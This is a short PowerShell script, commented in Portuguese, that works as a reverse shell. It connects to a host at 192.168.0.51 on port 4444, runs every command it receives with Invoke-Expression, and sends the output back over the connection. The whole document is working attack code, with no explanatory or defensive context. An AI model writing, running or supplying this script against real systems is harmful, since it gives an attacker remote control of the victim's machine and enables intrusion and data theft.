$sm=(New-Object Net.Sockets.TCPClient("192.168.0.51",4444)).GetStream();
[byte[]]$bt=0..65535|%{0};

while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){
    $d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);

    # Verifica se o comando inicia com "$cmd:"
    if ($d.StartsWith("$cmd:")) {
        $cmdOutput = Invoke-Expression -Command $d.Substring(5) 2>&1;
        $st=([text.encoding]::ASCII).GetBytes($cmdOutput);
    } else {
        $st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));
    }

    $sm.Write($st,0,$st.Length);
}
